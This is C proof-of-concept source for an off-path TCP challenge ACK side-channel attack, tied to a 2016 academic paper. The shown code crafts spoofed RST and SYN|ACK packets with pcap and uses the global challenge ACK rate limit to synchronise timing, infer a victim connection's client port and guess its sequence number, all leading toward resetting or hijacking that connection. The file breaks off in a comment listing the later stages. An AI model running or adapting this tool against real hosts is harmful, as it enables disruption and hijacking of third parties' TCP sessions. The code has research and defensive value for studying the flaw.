/*
 * Proof-of-concept code for:
 * "Off-Path TCP Exploits: Global Rate Limit Considered Dangerous"
 * http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf
 *
 * by Joshua J. Drake (jdrake@zimperium.com) on 2016-08-18
 *
 * NOTE: You need to use iptables to DROP packets from the target host/port
 *
 * # iptables -A INPUT -j DROP -p tcp -s [server addr] --sport [server port]
 *
 * Otherwise, your legitimate TCP stack will interfere with this program's
 * operation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

/* internet networking */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/* packet capturing */
#include <pcap/pcap.h>

/* raw packet crafting */
#define __FAVOR_BSD 1
#include <netinet/ip.h>
#include <netinet/tcp.h>

/* terminal interactions */
#include <termios.h>

/* precise timing */
#include <sys/time.h>

/* threading */
#include <pthread.h>

#ifndef ROUTER_MAC
#define ROUTER_MAC "\x01\x02\x03\x04\x05\x06"
#endif

#ifndef LOCAL_MAC
#define LOCAL_MAC "\xaa\xbb\xcc\xdd\xee\xff"
#endif

/*
 * if DEVICE is not defined, we'll try to find a suitable device..
 */
// #define DEVICE "ppp0"
#define SNAPLEN 1500

#define PACKETS_PER_SECOND 4000
#define PACKET_DELAY 100


/* TCP connection tracking */
typedef enum {
	CS_NEW = 0,
	CS_SYN_SENT,
	CS_CONNECTED,
	CS_FINISHED
} cstate_t;

const char *g_conn_states[] = {
	"NEW",
	"SYN",
	"EST",
	"FIN"
};

typedef struct packet_struct {
	u_char *buf;
	size_t len;
} packet_t;

typedef struct conn_struct {
	cstate_t state;
	uint16_t id;
	struct sockaddr_in src;
	struct sockaddr_in dst;
	/* in host endian */
	uint32_t seq;
	uint32_t ack;
} conn_t;

typedef struct thctx_struct {
	/* pcap */
	pcap_t *pch;
	int ipoff;

	/* connections */
	conn_t legit;
	conn_t spoof;

	/* other options */
	uint16_t winsz; // initial TCP window size
	int autostart;
	// inject or reset?
	u_long packets_per_second;
	u_long packet_delay;
	u_long start_seq;
} thctx_t;

/* for probing groups of values, limited by PACKETS_PER_SECOND */
typedef struct chunk_struct {
	u_long start;
	u_long end;
	int chacks;
} chunk_t;


/* global count for challenge ACKs received in one period */
static volatile int g_chack_cnt = 0;
/* global context for threads operating on pkts */
static volatile thctx_t g_ctx;
/* global RST packet for eliciting challenge ACKs */
static packet_t g_rst_pkt;


/* prototypes.. */
int set_up_attack(void);

uint16_t in_cksum(uint16_t *addr, size_t len);
void tcp_init(volatile conn_t *pconn, uint32_t seq);
int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn,
		u_char flags, char *data, size_t len);
int tcp_send(pcap_t *pch, volatile conn_t *pconn, u_char flags,
		char *data, size_t len);
int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags,
		uint32_t *pack, uint32_t *pseq, void **pdata, size_t *plen);
char *tcp_flags(u_char flags);

void setterm(int mode);
int kbhit(void);

int lookup_host(char *hostname, struct sockaddr_in *addr);
int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv,
		uint16_t lport, int *off2ip);


void usage(char *argv0)
{
	fprintf(stderr, "usage: %s [options] <server addr> <server port> <client addr>\n",
			argv0);
	fprintf(stderr, "\nsupported options:\n\n"
			"-a             automatically start the attack\n"
			"-d <usec>      packet delay\n"
			"-h             this help, duh.\n"
			// inject or reset?
			"-p <port>      spoofed client port\n"
			// if it differs from legit connection port
			"-P <port>      alternate server port (advanced)\n"
			"-r <rate>      max packets per second\n"
			"-s <sequence>  skip to this number when starting sequence inference\n"
			"-S <sequence>  spoofed client sequence number\n"
			// time offset? (to avoid sync_time_with_remote)
			"-A <sequence>  spoofed client ack number\n");
	// XXX: support range for ports/sequence values?
}


/*
 * The main function of this program simply checks prelimary arguments and
 * and launches the attack.
 */
int main(int argc, char *argv[])
{
	char *argv0;
	int c, srvport, altport = -1, cliport = -1;
	char myhost[512];
	struct sockaddr_in sin;

	/* look up this machine's address */
	if (gethostname(myhost, sizeof(myhost)) == -1) {
		perror("[!] gethostname");
		return 1;
	}
	if (!lookup_host(myhost, &sin))
		return 1;
	g_ctx.legit.src = sin;

	/* initalize stuff */
	srand(getpid());
	g_ctx.packets_per_second = PACKETS_PER_SECOND;
	g_ctx.packet_delay = PACKET_DELAY;

	argv0 = "challack";
	if (argv && argc > 0 && argv[0])
		argv0 = argv[0];

	if (argc < 4) {
		usage(argv0);
		return 1;
	}

	while ((c = getopt(argc, argv, "ad:hP:p:r:S:s:A:")) != -1) {
		switch (c) {
			case '?':
			case 'h':
				usage(argv0);
				return 1;

			case 'a':
				g_ctx.autostart = 1;
				break;

			case 'd':
				{
					char *pend = NULL;
					u_long tmp = strtoul(optarg, &pend, 0);

					if (!pend || *pend || tmp >= 1000000) {
						fprintf(stderr, "invalid delay: %s\n", optarg);
						return 1;
					}
					g_ctx.packet_delay = tmp;
				}
				break;

			case 'p':
				cliport = atoi(optarg);
				if (cliport < 1 || cliport > 65535) {
					fprintf(stderr, "[!] %s is not a valid port.\n", optarg);
					return 1;
				}
				break;

			case 'P':
				altport = atoi(optarg);
				if (altport < 1 || altport > 65535) {
					fprintf(stderr, "[!] %s is not a valid port.\n", optarg);
					return 1;
				}
				break;

			case 'r':
				{
					char *pend = NULL;
					u_long tmp = strtoul(optarg, &pend, 0);

					if (!pend || *pend || tmp > 1000000) {
						fprintf(stderr, "invalid packet rate: %s\n", optarg);
						return 1;
					}
					g_ctx.packets_per_second = tmp;
				}
				break;

			case 'S':
				{
					char *pend = NULL;
					u_long tmp = strtoul(optarg, &pend, 0);

					if (!pend || *pend) {
						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
						return 1;
					}
					g_ctx.spoof.seq = tmp;
				}
				break;

			case 's':
				{
					char *pend = NULL;
					u_long tmp = strtoul(optarg, &pend, 0);

					if (!pend || *pend) {
						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
						return 1;
					}
					g_ctx.start_seq = tmp;
				}
				break;

			case 'A':
				{
					char *pend = NULL;
					u_long tmp = strtoul(optarg, &pend, 0);

					if (!pend || *pend) {
						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
						return 1;
					}
					g_ctx.spoof.ack = tmp;
				}
				break;

			default:
				fprintf(stderr, "invalid option '%c'! try -h ...\n", c);
				return 1;
				/* not reached */
				break;
		}
	}

	/* adjust params */
	argc -= optind;
	argv += optind;

	/* process required arguments */
	if (argc < 3) {
		usage(argv0);
		return 1;
	}

	/* see if we can get the target server address */
	memset(&sin, 0, sizeof(sin));
	if (!lookup_host(argv[0], &sin))
		return 1;
	g_ctx.legit.dst = sin;
	g_ctx.spoof.dst = sin;

	/* see if we can get the client's address */
	if (!lookup_host(argv[2], &sin))
		return 1;
	g_ctx.spoof.src = sin;

	/* validate and record the server port */
	srvport = atoi(argv[1]);
	if (srvport < 1 || srvport > 65535) {
		fprintf(stderr, "[!] %s is not a valid port.\n", argv[1]);
		return 1;
	}
	g_ctx.legit.dst.sin_port = htons((uint16_t)srvport);
	g_ctx.spoof.dst.sin_port = htons((uint16_t)srvport);

	if (cliport != -1)
		g_ctx.spoof.src.sin_port = htons(cliport);
	if (altport != -1)
		g_ctx.spoof.dst.sin_port = htons(altport);

	printf("[*] Launching off-path challenge ACK attack against:\n"
			"    server: %s:%u\n", inet_ntoa(g_ctx.legit.dst.sin_addr),
			ntohs(g_ctx.legit.dst.sin_port));
	printf("    client: %s (port hint: %u)\n",
			inet_ntoa(g_ctx.spoof.src.sin_addr),
			ntohs(g_ctx.spoof.src.sin_port));
	printf("    from: %s\n", inet_ntoa(g_ctx.legit.src.sin_addr));
	if (g_ctx.spoof.seq)
		printf("    spoofed sequence: %lu (0x%lx)\n", (u_long)g_ctx.spoof.seq,
				(u_long)g_ctx.spoof.seq);
	if (g_ctx.packets_per_second != PACKETS_PER_SECOND)
		printf("    packets per second: %lu\n", g_ctx.packets_per_second);
	if (g_ctx.packet_delay != PACKET_DELAY)
		printf("    packet delay: %lu\n", g_ctx.packet_delay);

	/* here we go.. WOOO */
	return set_up_attack();
}


/*
 * attempt to resolve hostname as an ip address using inet_aton(3). if it
 * fails, we must have a DNS name so we try to look it up via gethostbyname(3).
 * if all is good, we fill in addr so that it can be returned via result
 * paramter, and return 1.
 *
 * if the lookup fails, we return 0. to report errors, we use herror(3)
 */
int lookup_host(char *hostname, struct sockaddr_in *addr)
{
	struct hostent *hent;

	memset(addr, 0, sizeof(*addr));
	addr->sin_family = AF_INET;
	if (!inet_aton(hostname, &(addr->sin_addr))) {
		hent = gethostbyname(hostname);
		if (hent == (struct hostent *)NULL) {
			char errstr[1024] = { 0 };

			snprintf(errstr, sizeof(errstr) - 1, "[!] Unable to resolve: \"%s\"",
					hostname);
			herror(errstr);
			return 0;
		}
		memcpy(&(addr->sin_addr), hent->h_addr, sizeof(struct in_addr));
	}
	return 1;
}


/*
 * try to start capturing packets from the specified host+port to the local
 * machine on the specified port.
 *
 * on succes, we return 1, on failure, 0
 */
int start_pcap(pcap_t **pcap, volatile struct sockaddr_in *psrv, uint16_t lport, int *off2ip)
{
   struct bpf_program bpfp; /* needed to set the filter */
   char errorstr[PCAP_ERRBUF_SIZE], filterstr[80], *iface;
   int filter = 1;

#ifdef DEVICE
   iface = (char *)malloc(16);
   strncpy(iface, DEVICE, sizeof(iface));
#else
   iface = pcap_lookupdev(errorstr);
   if (iface == NULL) {
	   fprintf(stderr, "[!] Unable to find a suitable capture device: %s\n",
			   errorstr);
	   return 0;
   }
#endif
   printf("[*] Starting capture on \"%s\" ...\n", iface);

   *pcap = pcap_open_live(iface, SNAPLEN, 8, 25, errorstr);
#ifdef DEVICE
   free(iface);
#endif
   if (*pcap == (pcap_t *)NULL) {
	   fprintf(stderr, "[!] pcap_open_live() failed: %s\n", errorstr);
	   return 0;
   }

   switch (pcap_datalink(*pcap)) {
	   case DLT_EN10MB:
		   *off2ip = 14;
		   break;

	   case DLT_SLIP:
		   *off2ip = 16;
		   break;

      case DLT_PPP:
		   *off2ip = 4;
		   filter = 0;
		   fprintf(stderr, "[-] PPP doesn't have filtering, problems may occur.\n");
		   break;

	  case DLT_FDDI:
		   fprintf(stderr, "[!] FDDI is not supported!\n");
		   return 1;

	  case DLT_RAW:
		   fprintf(stderr, "[-] Using the RAW datalink.\n");
		   *off2ip = 0;
		   break;

	  default:
		   *off2ip = 4;
		   break;
   }

   if (filter) {
	   sprintf(filterstr, "tcp and src %s and src port %d and dst port %d",
			   inet_ntoa(psrv->sin_addr), ntohs(psrv->sin_port), lport);
	   if (pcap_compile(*pcap, &bpfp, filterstr, 1, 0) == -1)
		   return 0;
	   if (pcap_setfilter(*pcap, &bpfp) == -1)
		   return 0;
   }
   return 1;
}


/*
 * a function to send a certain number of packets with a delay
 */
int send_packets_delay(packet_t *ppkt, int count, suseconds_t us_delay)
{
	struct timeval start, now, diff;

#ifdef DEBUG_SEND_PACKETS_DELAY
	printf("[*] Sending %d packets...\n", count);
#endif
	while (count > 0) {
		gettimeofday(&start, NULL);
		if (pcap_sendpacket(g_ctx.pch, ppkt->buf, ppkt->len) == -1)
			return 0;
		count--;

		do {
			gettimeofday(&now, NULL);
			timersub(&now, &start, &diff);
		} while (diff.tv_usec < us_delay);
#ifdef DEBUG_SEND_PACKETS_DELAY
		printf("    sent in %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif
	}
	return 1;
}

/*
 * a thread to receive packets =)
 */
void *recv_thread(void *arg)
{
	struct pcap_pkthdr *pchdr = NULL;
	const u_char *inbuf = NULL;
	int pcret;
	u_char flags;
	size_t datalen;

	/* listen for challenge ACKs and count them */
	while (1) {
		pcret = pcap_next_ex(g_ctx.pch, &pchdr, &inbuf);
		if (pcret == 1
			&& tcp_recv(pchdr, inbuf, &flags, NULL, NULL, NULL, &datalen)
			&& flags == TH_ACK) {
			g_chack_cnt++;
		}
	}

	/* not reached */
	return NULL;
}


/*
 * prepare the RST packet we'll use to elicit challenge ACKs on our legit
 * connection.
 */
int prepare_rst_packet(packet_t *ppkt)
{
	uint32_t old_seq;
	volatile conn_t *legit = &(g_ctx.legit);

	/* save the old sequence number */
	old_seq = legit->seq;

	/* advance it by some amount so that it is out of window */
	legit->seq += 5000;

	/* allocate a buffer for the packet */
	ppkt->len = 8192;
	ppkt->buf = malloc(ppkt->len);
	if (!ppkt->buf) {
		fprintf(stderr, "[!] no memory for RST packet!\n");
		return 0;
	}

	/* add the phys header */
	memcpy(ppkt->buf, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);

	/* craft the packet! */
	if (!tcp_craft(ppkt->buf + g_ctx.ipoff, &(ppkt->len), legit, TH_RST, "x", 1))
		return 0;

	/* adjust the length to include the phys part */
	ppkt->len += g_ctx.ipoff;

	/* set the sequence number back to the original value..
	 * this way the connection remains ok.
	 */
	legit->seq = old_seq;
	return 1;
}


/*
 * wait until the specified amount of time has elapsed
 */
void wait_until(const char *desc, struct timeval *pstart, time_t sec, suseconds_t usec)
{
	struct timeval now, diff;

	/* sanity check usage... */
	if (sec != 0 && usec != 0) {
		fprintf(stderr, "[!] %s : bad usage! specify sec or usec, not both! (%lu && %lu)\n",
				desc, sec, usec);
		exit(1); // EWW
	}

	/* if we already reached the time, we need to adjust... */
	gettimeofday(&now, NULL);
	timersub(&now, pstart, &diff);

	if (sec > 0 && diff.tv_sec >= sec) {
		fprintf(stderr, "[!] %s : already reached time! (%lu %lu vs. %lu %lu)\n",
				desc, diff.tv_sec, diff.tv_usec, sec, usec);
		exit(1); // EWW
	}
	if (usec > 0 && diff.tv_usec >= usec) {
		fprintf(stderr, "[!] %s : already reached time! (%lu %lu vs. %lu %lu) adding a second...\n",
				desc, diff.tv_sec, diff.tv_usec, sec, usec);
		pstart->tv_sec++;
	}

	for (;;) {
		usleep(250);
		gettimeofday(&now, NULL);
		timersub(&now, pstart, &diff);
		if (sec > 0 && diff.tv_sec >= sec)
			break;
		if (usec > 0 && diff.tv_usec >= usec)
			break;
	}
#ifdef DEBUG_WAIT_UNTIL
	printf("    %s took %lu %lu\n", desc, diff.tv_sec, diff.tv_usec);
#endif
}


/*
 * stage 1 - time synchronization
 *
 * 1. send 200 in-window RSTs spaced evenly
 * 2. count the challenge ACKs returned
 * 3. adjust accordingly
 * 4. confirm
 *
 * the goal is exactly 100 challenge ACKs received...
 */
int sync_time_with_remote(void)
{
	int attempts = 0, round = 0, chack_cnt[4] = { 0 };
	struct timeval round_start, start, now;
#ifdef DEBUG_SYNC_SEND_TIME
	struct timeval diff;
#endif

	/* if we don't synchronize within 3 attempts, give up.. */
	while (1) {
		gettimeofday(&round_start, NULL);

		/* sanity check to detect really bad situations... */
		if (g_chack_cnt > 0) {
			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
			return 0;
		}

		/* send 200 RSTs, spaced evenly */
		if (!send_packets_delay(&g_rst_pkt, 200, 5000))
			return 0;
		gettimeofday(&now, NULL);
#ifdef DEBUG_SYNC_SEND_TIME
		timersub(&now, &round_start, &diff);
		printf("  send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
#endif

		/* wait for 2 seconds for challenge ACKs... */
		wait_until("time-sync recv", &round_start, 2, 0);

		/* the delay before next round starts here.. */
		memcpy(&start, &now, sizeof(start));

		/* record the number of challenge acks seen */
		chack_cnt[round] = g_chack_cnt;
		g_chack_cnt = 0;

		printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1,
				chack_cnt[round]);

		/* did we sync?? */
		if (chack_cnt[round] == 100) {
			if (round == 3) {
				/* verified! */
				printf("[*] Time synchronization complete!\n");
				return 1;
			}
			/* we got lucky! verify... */
			round = 3;
			continue;
		}

		else if (chack_cnt[round] < 100) {
			fprintf(stderr, "[!] invalid number of challenge ACKs! WTF?\n");
			return 0;
		}

		/* not sync'd yet, decide how much to delay */
		else if (round < 2) {
			/* round 1 -> round 2 : delay by 5ms */
			uint64_t delay = 5000;

			if (round == 1) {
				/* round 2 -> round 3 : delay precisely */
				if (chack_cnt[round] >= chack_cnt[0]) {
					delay = (300 - chack_cnt[round]) * 5000;
				} else {
					delay = (chack_cnt[round] - 100) * 5000;
				}
			}

			/* do the delay! */
#ifdef DEBUG_SYNC_DELAY
			printf("    delaying for %lu us\n", delay);
#endif
			wait_until("time-sync delay", &start, 0, delay);
			round++;
		} else {
			/* start over :-/ */
			attempts++;
			if (attempts > 2) {
				fprintf(stderr, "[!] maximum attempts reached! giving up.\n");
				break;
			}
			fprintf(stderr, "[!] reached round %d without success, restarting...\n",
					round + 1);
			round = 0;
		}
	}

	/* fail! */
	return 0;
}


/*
 * build a test schedule based on the start and end of a range
 */
chunk_t *build_schedule(u_long start, u_long end, int *pnchunks)
{
	int i, num, nchunks, chunk_sz = g_ctx.packets_per_second;
	chunk_t *schedule = NULL;

	num = end - start;
	if (num <= chunk_sz) {
		fprintf(stderr, "[!] build_schedule: invalid range (too small)!\n");
		return NULL;
	}
	nchunks = (num / chunk_sz) + 1;

	schedule = (chunk_t *)malloc(sizeof(chunk_t) * nchunks);
	if (!schedule) {
		perror("[!] malloc");
		return NULL;
	}

	for (i = 0; i < nchunks; i++) {
		schedule[i].start = start + (i * chunk_sz);
		schedule[i].end = start + ((i + 1) * chunk_sz);
		if (schedule[i].end > end)
			schedule[i].end = end;
	}

	*pnchunks = nchunks;
	return schedule;
}


/*
 * build a test schedule based on the start and end of a range (reverse order)
 */
chunk_t *build_schedule_reverse(u_long start, u_long end, int *pnchunks)
{
	int i, j, num, nchunks, chunk_sz = g_ctx.packets_per_second;
	chunk_t *schedule = NULL;

	num = end - start;
	if (num <= chunk_sz) {
		fprintf(stderr, "[!] build_schedule_reverse: invalid range (too small)!\n");
		return NULL;
	}
	nchunks = (num / chunk_sz) + 1;

	schedule = (chunk_t *)malloc(sizeof(chunk_t) * nchunks);
	if (!schedule) {
		perror("[!] malloc");
		return NULL;
	}

	// XXX: TODO: fill the schedule properly, starting from the end - chunksz
	j = nchunks - 1;
	for (i = 0; i < nchunks; i++) {
		schedule[i].start = start + (j * chunk_sz);
		schedule[i].end = start + ((j + 1) * chunk_sz);
		if (schedule[i].end > end)
			schedule[i].end = end;
		j--;
	}

	*pnchunks = nchunks;
	return schedule;
}


/* stage 2 - four tuple inference
 *
 * send a spoofed SYN|ACK to try to elicit a challenge ACK for the purported
 * connection from our victim.
 */
int infer_four_tuple(void)
{
	struct timeval round_start;
#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
	struct timeval now, diff;
#endif
	volatile conn_t *spoof = &(g_ctx.spoof);
	int test_mode = -1;
	/* chunk-based search vars */
	chunk_t *sched = NULL;
	int nchunks = 0, ci = 0;
	/* binary search vars */
	u_long bs_start = 0, bs_end = 0, bs_mid = 0;

	while (1) {
		gettimeofday(&round_start, NULL);

		/* sanity check to detect really bad situations... */
		if (g_chack_cnt > 0) {
			fprintf(stderr, "[!] WTF? already received challenge ACKs??\n");
			return 0;
		}

		/* we have three possibilities:
		 * 1. we have a port hint -- we just want to test that one (but fall
		 *    back if it fails) -- test_mode:0
		 * 2. we have > PACKETS_PER_SECOND ports to test -- we want to use a
		 *    schedule -- test_mode:1
		 * 3. we have < PACKETS_PER_SECOND ports to test -- we want to use a
		 *    modified binary search. -- test_mode:2
		 */

		/* if we need to initialize the ranges, do so now */
		if (test_mode == -1) {
			/* if we already have a guess, try it first */
			if (spoof->src.sin_port) {
				/* if it hits, we set these equal to signify a win.
				 *
				 * we leave guess_mid set to 0 in case we missed..
				 */
				bs_mid = bs_start = bs_end = ntohs(spoof->src.sin_port);
				test_mode = 0;
			}
			/* no initial guess available... */
			else {
				/* initialize algorithm for port number checking
				 * ... "the default range on Linux is only from 32768 to 61000"
				 */
				// XXX: TODO: scale number of guesses per round based on feedback
				sched = build_schedule(32768, 61000, &nchunks);
				if (!sched)
					return 0;

				/* process chunks from 0 to nchunks */
				test_mode = 1;
			}
			/* test_mode 2 is launched via schedule exhaustion.. */
		}

		/* send spoofed packets in an attempt to elicit challenge ACKs to the
		 * victim. depending on how many ports we need to probe, we may use a
		 * different approach */
		if (test_mode == 0) {
			/* just test this single one */
			if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
				return 0;
		} else if (test_mode == 1) {
			/* process the current chunk */
			u_long guess;

			bs_mid = bs_start = sched[ci].start;
			bs_end = sched[ci].end;
			// XXX: TODO: implement optmization for < 14 ports to probe...
			for (guess = bs_start; guess < bs_end; guess++) {
				spoof->src.sin_port = htons(guess);
				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
					return 0;
				usleep(g_ctx.packet_delay);
			}

			/* we'll do maintenance after we check the results */
		} else if (test_mode == 2) {
			/* advance the binary search process! */
			u_long guess;

			bs_mid = (bs_start + bs_end) / 2;
			// XXX: TODO: implement optmization for < 14 ports to probe...
			for (guess = bs_mid; guess < bs_end; guess++) {
				spoof->src.sin_port = htons(guess);
				if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
					return 0;
				usleep(g_ctx.packet_delay);
			}
		}

		/* ensure we only send a single value once */
		spoof->src.sin_port = 0;

#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND
		gettimeofday(&now, NULL);
		timersub(&now, &round_start, &diff);
		printf("    sent %lu spoofed SYN|ACK packets in %lu %lu\n",
				bs_end - bs_start, diff.tv_sec, diff.tv_usec);
#endif

		/* send 100 RSTs */
		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
			return 0;

		/* get the number of challenge ACKs within this second */
		wait_until("tuple-infer recv", &round_start, 1, 0);

		printf("[*] tuple-infer: guessed port is in [%lu - %lu) (start: %lu): %3d challenge ACKs - %s\n",
				bs_mid, bs_end, bs_start,
				g_chack_cnt, g_chack_cnt == 99 ? "OK" : "NO");

		/* adjust the search based on the results and mode */
		if (g_chack_cnt == 100) {
			g_chack_cnt = 0;

			/* if we exhausted the range and still didn't find it, start over */
			if (test_mode == 0) {
				/* failed! try the bigger search.. */
				printf("[!] Your hint was incorrect! Falling back to search...\n");
				test_mode = -1;
			} else if (test_mode == 1) {
				/* advance the chunk */
				ci++;
				if (ci == nchunks) {
					printf("[!] Exhausted port chunk search...\n");
					return 0;
				}
			} else if (test_mode == 2) {
				if (bs_start >= bs_end) {
					/* FAIL! */
					printf("[!] Exhausted port binary search...\n");
					/* go back to the beginning of the schedule?? */
					return 0;
				} else {
					/* adjust range */
					bs_end = bs_mid;
				}
			}
		} else if (g_chack_cnt == 99) {
			g_chack_cnt = 0;

			if (test_mode == 0) {
				/* correct! */
				printf("[*] Confirmed client port (from hint): %lu\n", bs_start);
				spoof->src.sin_port = ntohs(bs_start);
				return 1;
			} else if (test_mode == 1) {
				/* proceed to a binary search of this block */
				/* if there was only one port tested, it must be it! */
				if (bs_end - bs_start <= 1) {
					printf("[*] Confirmed client port (via chunk): %lu\n", bs_start);
					spoof->src.sin_port = ntohs(bs_start);
					return 1;
				}
				test_mode = 2;
			} else if (test_mode == 2) {
				if (bs_end - bs_mid == 1) {
					/* we legitimately guessed it via binary search! */
					printf("[*] Guessed client port (via binary search): %lu\n", bs_mid);
					spoof->src.sin_port = ntohs(bs_mid);
					return 1;
				}
				else
					/* adjust range */
					bs_start = bs_mid;
			}
		} else {
			// XXX: TODO: scale number of guesses per round based on feedback
			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
			g_chack_cnt = 0;
		}
	}

	/* fail! */
	return 0;
}


/*
 * stage 3 - sequence number inference
 *
 * try to determine the victim's current sequence number
 *
 * this stage has 3 steps:
 *
 * 1. determine a block of windows containing the sequence number - step:0
 *    we do this using an optimized approach breaking the search space
 *    into blocks based on the window size.
 * 2. figure out which of the bins precisely the sequence number is in - step:1
 *    we use a binary search for this.
 * 3. figure out the exact sequence number - step:2,3
 *    we used a hybrid (chunk and binary) search for this step.
 */
int infer_sequence_number(void)
{
	struct timeval round_start, now, diff;
	volatile conn_t *spoof = &(g_ctx.spoof);
	int step = -1;
	/* printing status */
	u_long pr_start, pr_end, pkts_sent;
	/* chunk-based search vars */
	chunk_t *sched = NULL;
	int nchunks = 0, ci = 0;
	/* binary search vars */
	u_long bs_start = 0, bs_end = 0, bs_mid = 0;

	uint32_t seq_nblocks = UINT32_MAX / g_ctx.winsz;
	uint32_t seq_block = 0, seq_last_block = 0;

	while (1) {
		gettimeofday(&round_start, NULL);

		/* initialize whatever is needed */
		if (step == -1) {
			/* allocate a schedule for testing sequence blocks
			 * NOTE: the values in the schedule are actually block numbers
			 */
			step = 0;

			if (g_ctx.start_seq)
				sched = build_schedule(g_ctx.start_seq / g_ctx.winsz, UINT32_MAX / g_ctx.winsz, &nchunks);
			else
				sched = build_schedule(0, UINT32_MAX / g_ctx.winsz, &nchunks);
			if (!sched)
				return 0;
			/* further stages will launch as things progress */
		}

		/* send packets depending on the step we're in */
		if (step == 0) {
			u_long seq_block;

			/* set these for printing status */
			pr_start = sched[ci].start * g_ctx.winsz;
			pr_end = sched[ci].end * g_ctx.winsz;

			/* send em! */
			pkts_sent = 0;
			// XXX: TODO: implement optmization for < 14 ports to probe...
			for (seq_block = sched[ci].start; seq_block < sched[ci].end; seq_block++) {
				spoof->seq = seq_block * g_ctx.winsz;
				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
					return 0;
				usleep(g_ctx.packet_delay);
				pkts_sent++;
			}
			/* we'll do maintenance after we check the results */
		} else if (step == 1) {
			u_long seq_block;

			/* select a new mid */
			bs_mid = (bs_start + bs_end) / 2;

			/* set these for printing status */
			pr_start = bs_mid * g_ctx.winsz;
			pr_end = bs_end * g_ctx.winsz;

			/* send em! */
			pkts_sent = 0;
			// XXX: TODO: implement optmization for < 14 ports to probe...
			for (seq_block = bs_mid; seq_block < bs_end; seq_block++) {
				spoof->seq = seq_block * g_ctx.winsz;
				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
					return 0;
				usleep(g_ctx.packet_delay);
				pkts_sent++;
			}
			/* we'll do maintenance after we check the results */
		} else if (step == 2) {
			u_long seq_guess;

			/* set these for printing status */
			pr_start = sched[ci].end;
			pr_end = sched[ci].start;

			/* send em! */
			pkts_sent = 0;
			// XXX: TODO: implement optmization for < 14 ports to probe...
			for (seq_guess = pr_start; seq_guess > pr_end; seq_guess--) {
				spoof->seq = seq_guess;
				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
					return 0;
				usleep(g_ctx.packet_delay);
				pkts_sent++;
			}
			/* we'll do maintenance after we check the results */
		}

#ifdef DEBUG_SEQ_INFER_SPOOF_SEND
		gettimeofday(&now, NULL);
		timersub(&now, &round_start, &diff);
		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent,
				diff.tv_sec, diff.tv_usec);
#endif

		/* send 100 RSTs */
		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
			return 0;

		/* get the number of challenge ACKs within this second */
		wait_until("seq-infer recv", &round_start, 1, 0);

		printf("[*] seq-infer: guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
				pr_start, pr_end, pkts_sent, g_chack_cnt);

		/* adjust the search based on the results and mode */
		if (step == 0) {
			if (g_chack_cnt == 100) {
				ci++;
				if (ci == nchunks) {
					printf("[!] Exhausted seq window search...\n");
					return 0;
				}
			} else if (g_chack_cnt < 100) {
				/* figure out which chunk exactly! */
				bs_start = sched[ci].start;
				bs_end = sched[ci].end;
				printf("[*] Narrowed sequence (1) to %lu - %lu!\n",
						bs_start * g_ctx.winsz,
						(bs_end * g_ctx.winsz) + g_ctx.winsz);

				/* adjust winsz if g_chack_cnt < 99 */
				if (g_chack_cnt < 99) {
					u_long tmp, old;

					old = g_ctx.winsz;
					tmp = old * 2;
					printf("[*] NOTE: Window size too conservative, doubling to %lu...\n", tmp);
					g_ctx.winsz = tmp;

					/* we need to fix the range to the new window size too */
					bs_start = (bs_start * old) / tmp;
					bs_end = (bs_end * old) / tmp;
				}

				/* reset the schedule */
				free(sched);
				sched = NULL;
				nchunks = 0;

				/* proceed to the next step */
				step = 1;
			} else {
				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
			}
		} else if (step == 1) {
			if (g_chack_cnt == 100) {
				if (bs_start >= bs_end) {
					/* FAIL! */
					printf("[!] Exhausted seq window binary search...\n");
					/* go back to the beginning of the schedule?? */
					return 0;
				} else {
					/* adjust range */
					bs_end = bs_mid;
				}
			} else if (g_chack_cnt == 99) {
				/* if we only sent one guess this time, we won! */
				if (pkts_sent == 1) {
					u_long seq_block = bs_mid * g_ctx.winsz;

					printf("[*] Narrowed sequence (2) to: %lu - %lu\n",
							seq_block, seq_block + g_ctx.winsz);

					/* build a schedule working from right to left */
					sched = build_schedule_reverse(seq_block - g_ctx.winsz,
							seq_block + g_ctx.winsz, &nchunks);
					if (!sched)
						return 0;
					ci = 0;

					/* proceed to the next step */
					step = 2;
				}
				else
					/* adjust range */
					bs_start = bs_mid;
			} else {
				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
			}
		} else if (step == 2) {
			if (g_chack_cnt == 100) {
				ci++;
				if (ci == nchunks) {
					printf("[!] Exhausted sequence number search (1)...\n");
					return 0;
				}
			} else if (g_chack_cnt < 100) {
				ci++;
				if (ci == nchunks) {
					printf("[!] Exhausted sequence number search (2)...\n");
					return 0;
				}
			}
		}

#if 0
		// XXX: TODO: scale number of guesses per round based on feedback
#endif
		g_chack_cnt = 0;
	}

	/* fail! */
	return 0;
}


/*
 * conduct the attack:
 * 1. synchronize with remote clock
 * 2. infer four-tuple
 * 3. infer sequence number
 * 4. infer ack number
 * 5. reset/hijack
